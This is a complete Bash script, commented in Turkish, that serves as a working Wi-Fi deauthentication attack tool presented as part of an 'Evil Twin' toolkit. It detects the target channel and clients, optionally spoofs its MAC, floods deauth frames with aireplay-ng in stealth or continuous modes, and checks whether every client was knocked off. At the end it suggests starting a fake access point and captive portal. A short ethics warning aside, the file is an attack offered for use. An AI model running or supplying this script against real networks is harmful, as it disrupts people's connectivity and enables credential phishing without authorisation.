#!/bin/bash

# Evil Twin Attack - Deauthentication Attack Script
# Bu script hedef ağdaki kullanıcıları koparır
# Kullanım: ./deauth_attack.sh [interface] [bssid] [options]

# Renkli çıktı için ANSI kodları
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Banner
echo -e "${PURPLE}"
echo "═══════════════════════════════════════════════════════════════"
echo "                    EVIL TWIN ATTACK TOOLKIT                  "
echo "                   Deauthentication Attack                    "
echo "═══════════════════════════════════════════════════════════════"
echo -e "${NC}"

# Root kontrolü
if [[ $EUID -ne 0 ]]; then
   echo -e "${RED}[!] Bu script root yetkileri ile çalıştırılmalıdır!${NC}"
   echo -e "${YELLOW}[*] Kullanım: sudo $0 [interface] [bssid] [options]${NC}"
   exit 1
fi

# Etik uyarı
echo -e "${RED}"
echo "⚠️  ETİK UYARI ⚠️"
echo "Bu araç yalnızca eğitim amaçlı ve kendi ağlarınızda test için kullanılmalıdır."
echo "İzinsiz deauthentication saldırısı yasadışıdır ve ciddi hukuki sonuçları olabilir."
echo "Bu aracı kullanarak tüm sorumluluğu kabul etmiş olursunuz."
echo -e "${NC}"

# Parametreler
INTERFACE="$1"
TARGET_BSSID="$2"
TARGET_CLIENT=""
TARGET_CHANNEL=""
PACKET_COUNT="0"  # 0 = sürekli
ATTACK_INTERVAL="1"
ATTACK_DURATION="60"
OUTPUT_DIR="/tmp/evil_twin_deauth"
TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
LOG_FILE="$OUTPUT_DIR/deauth_log_$TIMESTAMP.txt"
AUTO_CHANNEL=false
BROADCAST_ATTACK=true
VERBOSE=false
CONTINUOUS=false
RANDOM_MAC=false
STEALTH_MODE=false
MONITOR_RECONNECT=false

# Fonksiyonlar
print_status() {
    echo -e "${BLUE}[*] $1${NC}"
    echo "$(date): [INFO] $1" >> "$LOG_FILE"
}

print_success() {
    echo -e "${GREEN}[✓] $1${NC}"
    echo "$(date): [SUCCESS] $1" >> "$LOG_FILE"
}

print_error() {
    echo -e "${RED}[!] $1${NC}"
    echo "$(date): [ERROR] $1" >> "$LOG_FILE"
}

print_warning() {
    echo -e "${YELLOW}[⚠] $1${NC}"
    echo "$(date): [WARNING] $1" >> "$LOG_FILE"
}

# Kullanım bilgisi
show_usage() {
    echo -e "${YELLOW}Kullanım:${NC}"
    echo -e "  ${CYAN}$0 [interface] [bssid] [options]${NC}"
    echo
    echo -e "${YELLOW}Parametreler:${NC}"
    echo -e "  ${CYAN}interface${NC}     Monitor mode'daki kablosuz arayüz"
    echo -e "  ${CYAN}bssid${NC}         Hedef access point BSSID'si"
    echo
    echo -e "${YELLOW}Seçenekler:${NC}"
    echo -e "  ${CYAN}-c, --client <mac>${NC}      Belirli istemciyi hedef al"
    echo -e "  ${CYAN}-ch, --channel <num>${NC}    Hedef kanal (otomatik tespit için -a)"
    echo -e "  ${CYAN}-n, --count <num>${NC}       Paket sayısı (0=sürekli, varsayılan: 0)"
    echo -e "  ${CYAN}-i, --interval <sec>${NC}    Saldırı aralığı (varsayılan: 1)"
    echo -e "  ${CYAN}-d, --duration <sec>${NC}    Saldırı süresi (varsayılan: 60)"
    echo -e "  ${CYAN}-o, --output <dir>${NC}      Çıktı dizini"
    echo -e "  ${CYAN}-a, --auto-channel${NC}      Otomatik kanal tespiti"
    echo -e "  ${CYAN}-b, --broadcast${NC}         Broadcast saldırısı (varsayılan)"
    echo -e "  ${CYAN}-r, --random-mac${NC}        Rastgele MAC adresi kullan"
    echo -e "  ${CYAN}-s, --stealth${NC}           Gizli mod (düşük paket oranı)"
    echo -e "  ${CYAN}-m, --monitor${NC}           Yeniden bağlanmayı izle"
    echo -e "  ${CYAN}-C, --continuous${NC}        Sürekli saldırı"
    echo -e "  ${CYAN}-v, --verbose${NC}           Detaylı çıktı"
    echo -e "  ${CYAN}-h, --help${NC}              Bu yardım mesajı"
    echo
    echo -e "${YELLOW}Örnekler:${NC}"
    echo -e "  ${CYAN}sudo $0 wlan0mon AA:BB:CC:DD:EE:FF${NC}"
    echo -e "  ${CYAN}sudo $0 wlan0mon AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66${NC}"
    echo -e "  ${CYAN}sudo $0 wlan0mon AA:BB:CC:DD:EE:FF -a -d 300${NC}"
    echo -e "  ${CYAN}sudo $0 wlan0mon AA:BB:CC:DD:EE:FF -s -n 5 -i 10${NC}"
    echo
}

# Komut satırı argümanlarını işle
parse_arguments() {
    # İlk 2 parametre pozisyonel
    if [ $# -ge 2 ]; then
        INTERFACE="$1"
        TARGET_BSSID="$2"
        shift 2
    fi
    
    # Kalan parametreler seçenekler
    while [[ $# -gt 0 ]]; do
        case $1 in
            -c|--client)
                TARGET_CLIENT="$2"
                BROADCAST_ATTACK=false
                shift 2
                ;;
            -ch|--channel)
                TARGET_CHANNEL="$2"
                shift 2
                ;;
            -n|--count)
                PACKET_COUNT="$2"
                shift 2
                ;;
            -i|--interval)
                ATTACK_INTERVAL="$2"
                shift 2
                ;;
            -d|--duration)
                ATTACK_DURATION="$2"
                shift 2
                ;;
            -o|--output)
                OUTPUT_DIR="$2"
                shift 2
                ;;
            -a|--auto-channel)
                AUTO_CHANNEL=true
                shift
                ;;
            -b|--broadcast)
                BROADCAST_ATTACK=true
                shift
                ;;
            -r|--random-mac)
                RANDOM_MAC=true
                shift
                ;;
            -s|--stealth)
                STEALTH_MODE=true
                ATTACK_INTERVAL="10"
                PACKET_COUNT="1"
                shift
                ;;
            -m|--monitor)
                MONITOR_RECONNECT=true
                shift
                ;;
            -C|--continuous)
                CONTINUOUS=true
                shift
                ;;
            -v|--verbose)
                VERBOSE=true
                shift
                ;;
            -h|--help)
                show_usage
                exit 0
                ;;
            -*)
                print_error "Bilinmeyen seçenek: $1"
                show_usage
                exit 1
                ;;
            *)
                print_error "Fazla parametre: $1"
                show_usage
                exit 1
                ;;
        esac
    done
}

# Parametreleri kontrol et
validate_parameters() {
    if [ -z "$INTERFACE" ] || [ -z "$TARGET_BSSID" ]; then
        print_error "Eksik parametreler!"
        show_usage
        exit 1
    fi
    
    # BSSID formatını kontrol et
    if ! echo "$TARGET_BSSID" | grep -qE '^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$'; then
        print_error "Geçersiz BSSID formatı: $TARGET_BSSID"
        print_status "Doğru format: XX:XX:XX:XX:XX:XX"
        exit 1
    fi
    
    # İstemci MAC kontrolü
    if [ -n "$TARGET_CLIENT" ]; then
        if ! echo "$TARGET_CLIENT" | grep -qE '^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$'; then
            print_error "Geçersiz istemci MAC formatı: $TARGET_CLIENT"
            exit 1
        fi
    fi
    
    # Kanal kontrolü
    if [ -n "$TARGET_CHANNEL" ]; then
        if ! [[ "$TARGET_CHANNEL" =~ ^[1-9]$|^1[0-4]$ ]]; then
            print_error "Geçersiz kanal: $TARGET_CHANNEL (1-14 arası olmalı)"
            exit 1
        fi
    fi
    
    # Arayüz kontrolü
    if ! iwconfig "$INTERFACE" &>/dev/null; then
        print_error "Arayüz bulunamadı: $INTERFACE"
        exit 1
    fi
    
    # Monitor mode kontrolü
    if ! iwconfig "$INTERFACE" 2>/dev/null | grep -q "Mode:Monitor"; then
        print_error "Arayüz monitor mode'da değil: $INTERFACE"
        print_status "Monitor mode için: airmon-ng start $INTERFACE"
        exit 1
    fi
}

# Çıktı dizinini hazırla
setup_output_directory() {
    if [ ! -d "$OUTPUT_DIR" ]; then
        mkdir -p "$OUTPUT_DIR"
        print_status "Çıktı dizini oluşturuldu: $OUTPUT_DIR"
    fi
    
    # Log dosyası yolunu güncelle
    LOG_FILE="$OUTPUT_DIR/deauth_log_$TIMESTAMP.txt"
    
    print_status "Log dosyası: $LOG_FILE"
}

# Hedef ağı kontrol et ve kanal tespit et
detect_target_channel() {
    if [ "$AUTO_CHANNEL" = true ] || [ -z "$TARGET_CHANNEL" ]; then
        print_status "Hedef ağ kanal tespiti yapılıyor..."
        
        # Kısa tarama yap
        timeout 15 airodump-ng --bssid "$TARGET_BSSID" -w /tmp/channel_detect --output-format csv "$INTERFACE" > /dev/null 2>&1
        
        local csv_file="/tmp/channel_detect-01.csv"
        
        if [ -f "$csv_file" ]; then
            local detected_channel=$(awk -F',' -v bssid="$TARGET_BSSID" '$1 == bssid {print $4; exit}' "$csv_file" | tr -d ' ')
            
            if [ -n "$detected_channel" ] && [[ "$detected_channel" =~ ^[0-9]+$ ]]; then
                TARGET_CHANNEL="$detected_channel"
                print_success "Hedef kanal tespit edildi: $TARGET_CHANNEL"
                
                # Ağ bilgilerini göster
                local network_info=$(awk -F',' -v bssid="$TARGET_BSSID" '$1 == bssid {print}' "$csv_file")
                if [ -n "$network_info" ]; then
                    IFS=',' read -ra INFO <<< "$network_info"
                    local essid="${INFO[13]}"
                    local power="${INFO[8]}"
                    local security="${INFO[5]}"
                    
                    echo -e "  ${CYAN}ESSID:${NC} ${essid:-"(Gizli)"}"
                    echo -e "  ${CYAN}Güç:${NC} $power dBm"
                    echo -e "  ${CYAN}Güvenlik:${NC} $security"
                fi
            else
                print_error "Hedef ağ bulunamadı: $TARGET_BSSID"
                print_status "BSSID'yi kontrol edin veya manuel kanal belirtin"
                exit 1
            fi
            
            # Temizlik
            rm -f /tmp/channel_detect*
        else
            print_error "Kanal tespiti başarısız"
            exit 1
        fi
    fi
}

# Bağlı istemcileri tespit et
detect_connected_clients() {
    if [ "$BROADCAST_ATTACK" = false ] && [ -z "$TARGET_CLIENT" ]; then
        print_status "Bağlı istemciler tespit ediliyor..."
        
        # İstemci taraması
        timeout 20 airodump-ng -c "$TARGET_CHANNEL" --bssid "$TARGET_BSSID" -w /tmp/client_detect --output-format csv "$INTERFACE" > /dev/null 2>&1
        
        local csv_file="/tmp/client_detect-01.csv"
        
        if [ -f "$csv_file" ]; then
            # İstemcileri listele
            echo -e "${CYAN}Bağlı istemciler:${NC}"
            local client_found=false
            
            # CSV'den istemcileri çıkar (AP satırlarını atla)
            awk -F',' 'NF==14 && /^[0-9A-Fa-f:]*,/ && $6 != "" {next} /^[0-9A-Fa-f:]*,/ && NF<14 { 
                gsub(/^ +| +$/, "", $1)
                gsub(/^ +| +$/, "", $4)
                gsub(/^ +| +$/, "", $6)
                if ($1 != "" && $6 == bssid) {
                    printf "  %s (Güç: %s dBm)\n", $1, $4
                }
            }' bssid="$TARGET_BSSID" "$csv_file"
            
            # İlk istemciyi otomatik seç
            TARGET_CLIENT=$(awk -F',' -v bssid="$TARGET_BSSID" 'NF==14 && /^[0-9A-Fa-f:]*,/ && $6 != "" {next} /^[0-9A-Fa-f:]*,/ && NF<14 { 
                gsub(/^ +| +$/, "", $1)
                gsub(/^ +| +$/, "", $6)
                if ($1 != "" && $6 == bssid) {
                    print $1
                    exit
                }
            }' "$csv_file")
            
            if [ -n "$TARGET_CLIENT" ]; then
                print_success "Hedef istemci seçildi: $TARGET_CLIENT"
                client_found=true
            fi
            
            if [ "$client_found" = false ]; then
                print_warning "Bağlı istemci bulunamadı, broadcast saldırısına geçiliyor"
                BROADCAST_ATTACK=true
            fi
            
            # Temizlik
            rm -f /tmp/client_detect*
        else
            print_warning "İstemci tespiti başarısız, broadcast saldırısı kullanılacak"
            BROADCAST_ATTACK=true
        fi
    fi
}

# Arayüzü hazırla
setup_interface() {
    print_status "Arayüz hazırlanıyor: $INTERFACE"
    
    # Kanala ayarla
    if [ -n "$TARGET_CHANNEL" ]; then
        print_status "Kanal $TARGET_CHANNEL'a ayarlanıyor..."
        iwconfig "$INTERFACE" channel "$TARGET_CHANNEL"
        
        if [ $? -eq 0 ]; then
            print_success "Kanal $TARGET_CHANNEL'a ayarlandı"
        else
            print_error "Kanal ayarlanamadı!"
            exit 1
        fi
    fi
    
    # MAC adresi değiştir
    if [ "$RANDOM_MAC" = true ]; then
        change_mac_address
    fi
}

# MAC adresi değiştir
change_mac_address() {
    print_status "MAC adresi değiştiriliyor..."
    
    # Rastgele MAC oluştur
    local new_mac=$(printf '02:%02x:%02x:%02x:%02x:%02x' $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)))
    
    # Arayüzü kapat
    ifconfig "$INTERFACE" down
    
    # MAC değiştir
    ifconfig "$INTERFACE" hw ether "$new_mac"
    
    # Arayüzü aç
    ifconfig "$INTERFACE" up
    
    if [ $? -eq 0 ]; then
        print_success "MAC adresi değiştirildi: $new_mac"
    else
        print_warning "MAC adresi değiştirilemedi"
    fi
}

# Deauth saldırısı
perform_deauth_attack() {
    print_status "Deauthentication saldırısı başlatılıyor..."
    
    # Saldırı parametrelerini göster
    echo
    print_status "Saldırı parametreleri:"
    echo -e "  ${CYAN}Hedef BSSID:${NC} $TARGET_BSSID"
    echo -e "  ${CYAN}Hedef İstemci:${NC} ${TARGET_CLIENT:-"Broadcast (Tümü)"}"
    echo -e "  ${CYAN}Kanal:${NC} $TARGET_CHANNEL"
    echo -e "  ${CYAN}Paket Sayısı:${NC} $([ "$PACKET_COUNT" -eq 0 ] && echo "Sürekli" || echo "$PACKET_COUNT")"
    echo -e "  ${CYAN}Aralık:${NC} $ATTACK_INTERVAL saniye"
    echo -e "  ${CYAN}Süre:${NC} $ATTACK_DURATION saniye"
    echo -e "  ${CYAN}Mod:${NC} $([ "$STEALTH_MODE" = true ] && echo "Gizli" || echo "Normal")"
    echo
    
    # Onay al
    if [ "$CONTINUOUS" = false ]; then
        read -p "Saldırıyı başlatmak istiyor musunuz? (y/N): " -n 1 -r
        echo
        if [[ ! $REPLY =~ ^[Yy]$ ]]; then
            print_status "Saldırı iptal edildi"
            exit 0
        fi
    fi
    
    # Saldırı komutunu oluştur
    local aireplay_cmd="aireplay-ng --deauth $PACKET_COUNT -a $TARGET_BSSID"
    
    if [ "$BROADCAST_ATTACK" = false ] && [ -n "$TARGET_CLIENT" ]; then
        aireplay_cmd="$aireplay_cmd -c $TARGET_CLIENT"
    fi
    
    aireplay_cmd="$aireplay_cmd $INTERFACE"
    
    print_status "Komut: $aireplay_cmd"
    
    # Yeniden bağlanma izleme
    if [ "$MONITOR_RECONNECT" = true ]; then
        start_reconnect_monitor &
        local monitor_pid=$!
        print_status "Yeniden bağlanma izleme başlatıldı (PID: $monitor_pid)"
    fi
    
    # Saldırı döngüsü
    local start_time=$(date +%s)
    local end_time=$((start_time + ATTACK_DURATION))
    local attack_count=0
    
    print_success "Deauth saldırısı başlatıldı!"
    
    while [ $(date +%s) -lt $end_time ]; do
        ((attack_count++))
        
        if [ "$VERBOSE" = true ]; then
            print_status "Saldırı #$attack_count gönderiliyor..."
        else
            printf "\r${BLUE}[*] Saldırı devam ediyor... %d saniye / %d paket${NC}" $(($(date +%s) - start_time)) $attack_count
        fi
        
        # Deauth paketlerini gönder
        if [ "$PACKET_COUNT" -eq 0 ]; then
            # Sürekli mod - belirli sayıda paket gönder
            timeout "$ATTACK_INTERVAL" aireplay-ng --deauth 10 -a "$TARGET_BSSID" $([ "$BROADCAST_ATTACK" = false ] && [ -n "$TARGET_CLIENT" ] && echo "-c $TARGET_CLIENT") "$INTERFACE" > /dev/null 2>&1
        else
            # Belirli sayıda paket
            aireplay-ng --deauth "$PACKET_COUNT" -a "$TARGET_BSSID" $([ "$BROADCAST_ATTACK" = false ] && [ -n "$TARGET_CLIENT" ] && echo "-c $TARGET_CLIENT") "$INTERFACE" > /dev/null 2>&1
        fi
        
        # Gizli modda daha uzun bekle
        if [ "$STEALTH_MODE" = true ]; then
            sleep "$ATTACK_INTERVAL"
        else
            sleep 1
        fi
        
        # Sürekli mod kontrolü
        if [ "$CONTINUOUS" = true ] && [ $(date +%s) -ge $end_time ]; then
            end_time=$(($(date +%s) + ATTACK_DURATION))
        fi
    done
    
    printf "\n"
    
    # İzleme sürecini sonlandır
    if [ "$MONITOR_RECONNECT" = true ] && [ -n "$monitor_pid" ]; then
        kill $monitor_pid 2>/dev/null
        wait $monitor_pid 2>/dev/null
    fi
    
    print_success "Deauth saldırısı tamamlandı!"
    print_status "Toplam saldırı sayısı: $attack_count"
    print_status "Toplam süre: $(($(date +%s) - start_time)) saniye"
}

# Yeniden bağlanma izleme
start_reconnect_monitor() {
    local monitor_file="/tmp/reconnect_monitor_$TIMESTAMP.txt"
    
    while true; do
        # Hedef ağı izle
        timeout 30 airodump-ng -c "$TARGET_CHANNEL" --bssid "$TARGET_BSSID" -w /tmp/reconnect_check --output-format csv "$INTERFACE" > /dev/null 2>&1
        
        local csv_file="/tmp/reconnect_check-01.csv"
        
        if [ -f "$csv_file" ]; then
            # İstemci sayısını kontrol et
            local current_clients=$(awk -F',' 'NF==14 && /^[0-9A-Fa-f:]*,/ && $6 != "" {next} /^[0-9A-Fa-f:]*,/ && NF<14 { 
                gsub(/^ +| +$/, "", $6)
                if ($6 == bssid) count++
            } END {print count+0}' bssid="$TARGET_BSSID" "$csv_file")
            
            echo "$(date): İstemci sayısı: $current_clients" >> "$monitor_file"
            
            if [ "$VERBOSE" = true ] && [ "$current_clients" -gt 0 ]; then
                print_warning "$current_clients istemci yeniden bağlandı"
            fi
            
            # Temizlik
            rm -f /tmp/reconnect_check*
        fi
        
        sleep 10
    done
}

# Saldırı sonrası analiz
post_attack_analysis() {
    print_status "Saldırı sonrası analiz yapılıyor..."
    
    # Hedef ağı kontrol et
    timeout 15 airodump-ng -c "$TARGET_CHANNEL" --bssid "$TARGET_BSSID" -w /tmp/post_attack --output-format csv "$INTERFACE" > /dev/null 2>&1
    
    local csv_file="/tmp/post_attack-01.csv"
    
    if [ -f "$csv_file" ]; then
        # İstemci sayısını kontrol et
        local client_count=$(awk -F',' 'NF==14 && /^[0-9A-Fa-f:]*,/ && $6 != "" {next} /^[0-9A-Fa-f:]*,/ && NF<14 { 
            gsub(/^ +| +$/, "", $6)
            if ($6 == bssid) count++
        } END {print count+0}' bssid="$TARGET_BSSID" "$csv_file")
        
        echo
        echo -e "${GREEN}"
        echo "═══════════════════════════════════════════════════════════════"
        echo "                      SALDIRI SONUÇLARI                       "
        echo "═══════════════════════════════════════════════════════════════"
        echo -e "${NC}"
        
        echo -e "${CYAN}Hedef BSSID:${NC} $TARGET_BSSID"
        echo -e "${CYAN}Hedef Kanal:${NC} $TARGET_CHANNEL"
        echo -e "${CYAN}Saldırı Türü:${NC} $([ "$BROADCAST_ATTACK" = true ] && echo "Broadcast" || echo "Targeted ($TARGET_CLIENT)")"
        echo -e "${CYAN}Mevcut İstemci Sayısı:${NC} $client_count"
        echo -e "${CYAN}Saldırı Modu:${NC} $([ "$STEALTH_MODE" = true ] && echo "Gizli" || echo "Normal")"
        
        if [ "$client_count" -eq 0 ]; then
            print_success "Tüm istemciler başarıyla koptu!"
        else
            print_warning "$client_count istemci hala bağlı"
            print_status "Daha uzun saldırı veya farklı parametreler deneyin"
        fi
        
        # Temizlik
        rm -f /tmp/post_attack*
    else
        print_warning "Saldırı sonrası analiz yapılamadı"
    fi
    
    echo
}

# Sürekli saldırı
continuous_attack() {
    print_status "Sürekli saldırı modu başlatılıyor..."
    print_warning "Durdurmak için Ctrl+C tuşlayın"
    
    local round=1
    
    while true; do
        echo
        print_status "Saldırı turu #$round"
        
        # Saldırı yap
        perform_deauth_attack
        
        # Kısa analiz
        post_attack_analysis
        
        ((round++))
        
        # 60 saniye bekle
        print_status "60 saniye bekleniyor..."
        sleep 60
    done
}

# Temizlik
cleanup() {
    print_status "Temizlik yapılıyor..."
    
    # Arka plan süreçlerini sonlandır
    pkill -f "aireplay-ng.*$INTERFACE" 2>/dev/null
    pkill -f "airodump-ng.*$INTERFACE" 2>/dev/null
    
    # Geçici dosyaları temizle
    rm -f /tmp/channel_detect* /tmp/client_detect* /tmp/reconnect_check* /tmp/post_attack* /tmp/reconnect_monitor_*.txt
    
    print_success "Temizlik tamamlandı"
}

# Ana fonksiyon
main() {
    echo
    print_status "Deauth attack başlatılıyor..."
    echo
    
    # Parametreleri kontrol et
    validate_parameters
    
    # Çıktı dizinini hazırla
    setup_output_directory
    
    # Hedef kanal tespit et
    detect_target_channel
    
    # Arayüzü hazırla
    setup_interface
    
    # Bağlı istemcileri tespit et
    detect_connected_clients
    
    echo
    
    # Sürekli saldırı kontrolü
    if [ "$CONTINUOUS" = true ]; then
        continuous_attack
    else
        # Tek saldırı
        perform_deauth_attack
        
        # Saldırı sonrası analiz
        post_attack_analysis
    fi
    
    echo
    print_success "Deauth attack tamamlandı!"
    echo -e "${YELLOW}Log dosyası:${NC} $LOG_FILE"
    echo
    
    # Evil Twin önerisi
    print_status "Evil Twin saldırısı için öneriler:"
    echo -e "  ${CYAN}1. Sahte AP başlat: hostapd config/hostapd.conf${NC}"
    echo -e "  ${CYAN}2. DHCP başlat: dnsmasq -C config/dnsmasq.conf${NC}"
    echo -e "  ${CYAN}3. Captive Portal: lighttpd -f config/lighttpd.conf${NC}"
    echo -e "  ${CYAN}4. Bu scripti sürekli çalıştır: $0 $INTERFACE $TARGET_BSSID -C${NC}"
    echo
}

# Sinyal yakalama
trap cleanup EXIT INT TERM

# Komut satırı argümanlarını işle
parse_arguments "$@"

# Ana fonksiyonu çalıştır
main